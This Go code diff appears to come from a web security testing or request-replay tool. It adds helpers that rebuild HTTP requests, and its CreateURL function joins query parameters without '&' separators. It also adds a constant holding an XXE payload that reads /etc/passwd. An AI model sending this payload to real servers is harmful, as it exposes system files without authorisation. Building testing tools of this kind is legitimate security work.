@@ -14,6 +14,11 @@ import (
 const (
 	HeaderContentTypeApplication = "application/x-www-form-urlencoded"
 	HeaderContentType            = "Content-Type"
+	XmlPayload                   = `<?xml version="1.0"?>
+    <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    <foo>&xxe;</foo>`
 )
 
 func ParseGetParams(request *http.Request) []models.Params {
@@ -111,4 +116,33 @@ func CleanNonUTF8(input []byte) []byte {
 		input = input[size:]
 	}
 	return output
+}
+
+func CreateURL(modelRepeat models.Request) string {
+	url := fmt.Sprintf("%s://%s%s", modelRepeat.Scheme, modelRepeat.Host, modelRepeat.Path)
+	for i, v := range modelRepeat.GetParams {
+		if i == 0 {
+			url += "?"
+		}
+		url += v.Key + "=" + v.Value
+	}
+	return url
+}
+
+func AddHeaders(newRequest *http.Request, headers []models.Params) {
+	for _, header := range headers {
+		newRequest.Header.Add(header.Key, header.Value)
+	}
+}
+
+func AddCookies(newRequest *http.Request, cookies []models.Params) {
+	for _, value := range cookies {
+		newRequest.AddCookie(&http.Cookie{Name: value.Key, Value: value.Value})
+	}
+}
+
+func AddPostParams(newRequest *http.Request, postParams []models.Params) {
+	for _, value := range postParams {
+		newRequest.PostForm.Add(value.Key, value.Value)
+	}
 }
